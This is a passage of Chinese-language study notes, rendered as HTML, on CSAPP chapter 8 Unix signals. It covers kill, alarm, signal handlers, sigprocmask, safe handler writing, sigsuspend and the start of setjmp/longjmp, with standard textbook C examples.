class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span> </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">kill</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">int</span> sig)</span>; <span class="comment">//返回：若成功则为0, 若错误则为- 1,</span></span><br></pre></td></tr></table></figure><ul><li>pid&gt;0，发送给进程pid。</li><li>pid=0，发送给<code>调用进程所在进程组</code>的每个进程。</li><li>pid&lt;0，发送给<code>进程组|pid|中的每个进程</code>。</li></ul><p>父进程用kill函数发送 SIGKILL 信号给它的子进程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;csapp.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Child sleeps until SIGKILL signal received, then dies */</span></span><br><span class="line">    <span class="keyword">if</span> ((pid = Fork()) == <span class="number">0</span>) &#123;</span><br><span class="line">        Pause();  <span class="comment">/* Wait for a signal to arrive */</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;control should never reach here!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Parent sends a SIGKILL signal to a child */</span></span><br><span class="line">    Kill(pid, SIGKILL);</span><br><span class="line">    wait(pid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;SIGKILL!@!&quot;</span>);<span class="comment">//确认子进程终止</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>用alarm函数发送信号</li></ol><p>进程可以通过调用 <code>alarm 函数向它自己发送 SIGALRM 信号</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">alarm</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> secs)</span>; </span><br><span class="line"><span class="comment">//返回：前一次闹钟剩余的秒数，若以前没有设定闹钟，则为0</span></span><br></pre></td></tr></table></figure><h4 id="接收信号"><a href="#接收信号" class="headerlink" title="接收信号"></a>接收信号</h4><p>当内核把进程 从<code>内核模式</code>切换到<code>用户模式</code>时，它会检查进程的<code>未被阻塞的待处理信号的 (pending &amp; ~blocked)</code></p><ul><li>如果这个集合为空（通常情况下），那么内核将控制传递到 的逻辑控制流中的下一条指令</li><li>如果集合是非空的，那么内核选择集合中的某个信号,并且且强制进程接收信号，收到这个信号会触发进程采取某种行为， 一旦进程完成了这个行为，那么控制就传递回进程的逻辑控制流中的下一条指令。</li></ul><p>每个信号类型都有一个预定义的默认行为。</p><ul><li>进程终止</li><li>进程终止并转储内存。</li><li>进程停止（挂起）直到被 SIGCONT 信号重启。</li><li>进程忽略该信号。</li></ul><p>可以通过使用 <code>signal 函数</code>修改和信号相 联的默认行为,唯一的例外是 <code>SIGSTOP</code> 和<code>SIGKILL</code>,它们的默认行为是不能修改的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span> </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*<span class="type">sighandler_t</span>)</span><span class="params">(<span class="type">int</span>)</span>; </span><br><span class="line"><span class="type">sighandler_t</span> <span class="title function_">signal</span><span class="params">(<span class="type">int</span> signum, <span class="type">sighandler_t</span> handler)</span>; </span><br><span class="line"><span class="comment">//返回：若成功则为指向前次处理程序的指针，若出错则为 SIG_ERR(不设置 errno)</span></span><br></pre></td></tr></table></figure><p>signal 函数可以通过设置handeler来改变和信号 signum 相关联的行为：</p><ul><li>如果<code>handler SIG_IGN</code>, 那么忽略类型为 signum 的信号。</li><li>如果 <code>handler SIG_DFL</code>, 那么类型为 signum 的信号行为恢复为默认行为</li><li>否则， handler 就是用户定义的函数的地址，这个函数被称为<code>信号处理程序</code>。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;csapp.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sigint_handler</span><span class="params">(<span class="type">int</span> sig)</span> <span class="comment">/* SIGINT handler */</span>   </span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Caught SIGINT!\n&quot;</span>);   </span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);                     </span><br><span class="line">&#125;                                              </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Install the SIGINT handler */</span></span><br><span class="line">    <span class="keyword">if</span> (signal(SIGINT, sigint_handler) == SIG_ERR) </span><br><span class="line">        unix_error(<span class="string">&quot;signal error&quot;</span>);                 </span><br><span class="line">    pause(); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240216154617280.png" alt="image-20240216154617280"></p><blockquote><p>练习题8.7</p><p>编写一个叫做 snooze 的程序，它有一个命令行参数，用这个参数调用<br>练习题 8. 中的 snooze 函数，然后终止。编写程序，使得用户可以通过在键盘上输入Ctrl+C 中断 snooze 函数。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">handler</span><span class="params">(<span class="type">int</span> sig)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">snooze</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> secs)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> rc = sleep(secs);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Slept for %d of %d secs.\n&quot;</span>, secs-rc, secs);</span><br><span class="line">    <span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;usage: %s &lt;secs&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (signal(SIGINT, handler) == SIG_ERR) </span><br><span class="line">        unix_error(<span class="string">&quot;signal error\n&quot;</span>);</span><br><span class="line">    (<span class="type">void</span>)snooze(atoi(argv[<span class="number">1</span>]));</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="阻塞和解除阻塞信号"><a href="#阻塞和解除阻塞信号" class="headerlink" title="阻塞和解除阻塞信号"></a>阻塞和解除阻塞信号</h4><p><code>隐式阻塞机制</code>。内核默认阻塞任何当前处理程序正在处理信号类型的待处理的信号。</p><p><code>显式阻塞机制</code>。应用程序可以使用 <code>sigprocmask 函数</code>和它的辅助函数，明确地阻塞和解除阻塞选定的信号。</p><p>sigprocmask 函数改变当前阻塞的信号集合 (blocked 位向量）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span> </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sigprocmask</span><span class="params">(<span class="type">int</span> how, <span class="type">const</span> <span class="type">sigset_t</span> *<span class="built_in">set</span>, <span class="type">sigset_t</span> *oldset)</span>; <span class="comment">//检查或修改进程的信号掩码</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sigemptyset</span><span class="params">(<span class="type">sigset_t</span> *<span class="built_in">set</span>)</span>; <span class="comment">//初始化 set 为空集合。</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sigfillset</span><span class="params">(<span class="type">sigset_t</span> *<span class="built_in">set</span>)</span>; <span class="comment">//把每个信号都添加到set中。</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sigaddset</span><span class="params">(<span class="type">sigset_t</span> *<span class="built_in">set</span>, <span class="type">int</span> signum)</span>;<span class="comment">//把 signum 添加到 set</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sigdelset</span><span class="params">(<span class="type">sigset_t</span> *<span class="built_in">set</span>, <span class="type">int</span> signum)</span>;<span class="comment">//从set中删除signum</span></span><br><span class="line"><span class="comment">//返回：如果成功则为0, 若出错则为-1</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sigismember</span><span class="params">(<span class="type">const</span> <span class="type">sigset_t</span> *<span class="built_in">set</span>, <span class="type">int</span> signum)</span>; </span><br><span class="line"><span class="comment">//返回：若 signum set 的成员则为 1, 如果不是则为0若出错则为—1</span></span><br></pre></td></tr></table></figure><p>具体行为以来how的值</p><ul><li><code>SIG_BLOCK</code>: set 中的信号添加到 blocked (blocked=blocked I set)</li><li><code>SIG_ UNBLOCK</code>: blocked 中删除 set 中的信号 (blocked=blocked &amp;~set)</li><li><code>SIG_SETMASK</code>: block=set</li></ul><h4 id="编写信号处理程序"><a href="#编写信号处理程序" class="headerlink" title="编写信号处理程序"></a>编写信号处理程序</h4><ol><li>安全的信号处理</li></ol><ul><li><p>处理程序要尽可能简单。</p></li><li><p>在处理程序中只调用<code>异步信号安全的函数</code>。(可重入的且不能被信号处理程序中断)。</p></li></ul><p>异步信号安全的函数</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240216222621366.png" alt="image-20240216222621366"></p><p>信号处理程序中产生输出唯一安全的方法是使用<code>write</code>函数。</p><ul><li><code>保存和恢复errno</code>。</li></ul><p>在进入处理程序时把 errno 保存在某个局部变最中，在处理程序返回前恢复它。</p><ul><li><p><code>阻塞所有的信号，保护对共享全局数据结构的访问</code>。</p></li><li><p>用volatile 声明全局变量</p></li></ul><p><code>volatile限定符</code>强迫编译器每次在代码中引用时，都要从内存中读取值。</p><ul><li>sig_atomic_t 声明标志。</li></ul><p>对sig_atomic_t声明的变量的读和写会是原子的（不可中断的）。</p><ol><li>正确的信号处理</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">handler1</span><span class="params">(<span class="type">int</span> sig)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> olderrno = errno;<span class="comment">// 保存和恢复 errno</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((waitpid(<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>)) &lt; <span class="number">0</span>)<span class="comment">//-1表示由父进程创建的所有子进程</span></span><br><span class="line">        sio_error(<span class="string">&quot;waitpid error&quot;</span>);</span><br><span class="line">    Sio_puts(<span class="string">&quot;Handler reaped child\n&quot;</span>);</span><br><span class="line">    Sleep(<span class="number">1</span>);</span><br><span class="line">    errno = olderrno;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i, n;</span><br><span class="line">    <span class="type">char</span> buf[MAXBUF];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (signal(SIGCHLD, handler1) == SIG_ERR)<span class="comment">//=设置SIGCHLD的信号处理程序</span></span><br><span class="line">        unix_error(<span class="string">&quot;signal error&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Parent creates children */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (Fork() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Hello from child %d\n&quot;</span>, (<span class="type">int</span>)getpid());</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Parent waits for terminal input and then processes it */</span></span><br><span class="line">    <span class="keyword">if</span> ((n = read(STDIN_FILENO, buf, <span class="keyword">sizeof</span>(buf))) &lt; <span class="number">0</span>)</span><br><span class="line">        unix_error(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent processing input\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        ;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于信号处理函数没有解决信号不会排队等待这样的情况。当接受并捕获第一个信号进入处理程序，第二个信号就传送并添加到了待处理信号集合里。然而，因为 SIGCHLD 信号被 SIGCHLD理程序阻塞了，所以第二个信号就不会被接收。第三个信号到达。有了一个待处理的 SIGCHLD, 第三个信号会被丢弃。</p><p>通过修改handler函数来修正这一问题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">handler2</span><span class="params">(<span class="type">int</span> sig)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> olderrno = errno;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使得每次 SIGCHLD 处理程序被调用时，回收尽可能多的僵死子进程。</span></span><br><span class="line">    <span class="keyword">while</span> (waitpid(<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        Sio_puts(<span class="string">&quot;Handler reaped child\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (errno != ECHILD)</span><br><span class="line">        Sio_error(<span class="string">&quot;waitpid error&quot;</span>);</span><br><span class="line">    Sleep(<span class="number">1</span>);</span><br><span class="line">    errno = olderrno;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>可移植的信号处理</li></ol><p>Posix 标准定义了 <code>sigaction</code> 函数，它允许用户在设置信号处理时，明确指定他们想要的信号处理语义。</p><h4 id="同步流以避免讨厌的并发错误"><a href="#同步流以避免讨厌的并发错误" class="headerlink" title="同步流以避免讨厌的并发错误"></a>同步流以避免讨厌的并发错误</h4><ul><li>通过设置和解除阻塞的<code>SIGCHLD</code>信号来避免进程在添加进<code>job组</code>前终止导致把不存在的子进程添加到作业列表中。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;csapp.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">handler</span><span class="params">(<span class="type">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> olderrno = errno;</span><br><span class="line">    <span class="type">sigset_t</span> mask_all, prev_all;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Sigfillset</span>(&amp;mask_all);</span><br><span class="line">    <span class="keyword">while</span> ((pid = <span class="built_in">waitpid</span>(<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>)) &gt; <span class="number">0</span>) &#123; <span class="comment">/* Reap a zombie child */</span></span><br><span class="line">        <span class="built_in">Sigprocmask</span>(SIG_BLOCK, &amp;mask_all, &amp;prev_all);<span class="comment">//防止重入</span></span><br><span class="line">        <span class="built_in">deletejob</span>(pid); <span class="comment">/* Delete the child from the job list */</span></span><br><span class="line">        <span class="built_in">Sigprocmask</span>(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (errno != ECHILD)</span><br><span class="line">        <span class="built_in">Sio_error</span>(<span class="string">&quot;waitpid error&quot;</span>);</span><br><span class="line">    errno = olderrno;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line">    <span class="type">sigset_t</span> mask_all, mask_one, prev_one;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Sigfillset</span>(&amp;mask_all);<span class="comment">//把每个信号添加到mask_all</span></span><br><span class="line">    <span class="built_in">Sigemptyset</span>(&amp;mask_one);<span class="comment">//初始化mask_one为空集合</span></span><br><span class="line">    <span class="built_in">Sigaddset</span>(&amp;mask_one, SIGCHLD);<span class="comment">// 把SIGCHLD添加到mask_one</span></span><br><span class="line">    <span class="built_in">Signal</span>(SIGCHLD, handler);<span class="comment">//设置SIGCHLD异常处理函数</span></span><br><span class="line">    <span class="built_in">initjobs</span>(); <span class="comment">/* Initialize the job list */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">Sigprocmask</span>(SIG_BLOCK, &amp;mask_one, &amp;prev_one); <span class="comment">/* Block SIGCHLD */</span></span><br><span class="line">        <span class="keyword">if</span> ((pid = <span class="built_in">Fork</span>()) == <span class="number">0</span>) &#123; <span class="comment">/* Child process */</span></span><br><span class="line">            <span class="built_in">Sigprocmask</span>(SIG_SETMASK, &amp;prev_one, <span class="literal">NULL</span>); <span class="comment">/* Unblock SIGCHLD */</span></span><br><span class="line">            <span class="built_in">Execve</span>(<span class="string">&quot;/bin/date&quot;</span>, argv, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">Sigprocmask</span>(SIG_BLOCK, &amp;mask_all, <span class="literal">NULL</span>); <span class="comment">/* Parent process */</span></span><br><span class="line">        <span class="built_in">addjob</span>(pid);  <span class="comment">/* Add the child to the job list */</span></span><br><span class="line">        <span class="built_in">Sigprocmask</span>(SIG_SETMASK, &amp;prev_one, <span class="literal">NULL</span>);  <span class="comment">/* Unblock SIGCHLD */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="显示地等待信号"><a href="#显示地等待信号" class="headerlink" title="显示地等待信号"></a>显示地等待信号</h4><ul><li>当<code>linux shell</code>创建一个前台作业时，在接收下一条用户命令之前，它必须等待作业终止，被<code>SIGCHLD</code>处理程序回收。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sigsuspend</span><span class="params">(<span class="type">const</span> <span class="type">sigset_t</span> *mask)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//sigsuspend 函数暂时用mask替换当前的阻塞集合，然后挂起该进程，直到收到一个信号，其行为要么是运行一个处理程序，要么是终止该进程。如果它的行为是终止，那么该进程不从sigsuspend 返回就直接终止。如果它的行为是运行一个处理程序，那么sigsuspend 从处理程序返回，恢复调用sigsuspend 时原有的阻塞集合。sigsuspend 函数等价于下述代码的原子的（不可中断的）版本：</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//等价于下面三条语句的原子版本</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">sigprocmask</span>(SIG_SETMASK, &amp;mask, &amp;prev);</span><br><span class="line"><span class="built_in">pause</span>();</span><br><span class="line"><span class="built_in">sigprocmask</span>(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;csapp.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">sig_atomic_t</span> pid;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="type">int</span> s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> olderrno = errno;</span><br><span class="line">    pid = <span class="built_in">Waitpid</span>(<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    errno = olderrno;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="type">int</span> s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">sigset_t</span> mask, prev;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Signal</span>(SIGCHLD, sigchld_handler);</span><br><span class="line">    <span class="built_in">Signal</span>(SIGINT, sigint_handler);</span><br><span class="line">    <span class="built_in">Sigemptyset</span>(&amp;mask);</span><br><span class="line">    <span class="built_in">Sigaddset</span>(&amp;mask, SIGCHLD);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">Sigprocmask</span>(SIG_BLOCK, &amp;mask, &amp;prev); <span class="comment">/* Block SIGCHLD */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">Fork</span>() == <span class="number">0</span>) <span class="comment">/* Child */</span></span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Wait for SIGCHLD to be received */</span></span><br><span class="line">        pid = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (!pid)</span><br><span class="line">            <span class="built_in">Sigsuspend</span>(&amp;prev);<span class="comment">//设置掩码，然后挂起进程</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Optionally unblock SIGCHLD */</span></span><br><span class="line">        <span class="built_in">Sigprocmask</span>(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Do some work after receiving SIGCHLD */</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="非本地跳转"><a href="#非本地跳转" class="headerlink" title="非本地跳转"></a>非本地跳转</h3><ul><li>通过<code>longjmp</code>和<code>setjmp</code>实现。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">setjmp</span><span class="params">(jmp_buf env)</span></span>;<span class="comment">//返回0</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sigsetjmp</span><span class="params">(sigjmp_buf env, <span class="type">int</span> savesigs)</span></span>;<span class="comment">//返回非0</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">longjmp</span><span class="params">(jmp_buf env, <span class="type">int</span> retval)</span></span>;<span class="comment">//从不返回。</span></span><br><span class="line"><span class="function"><span class="type">void</span> 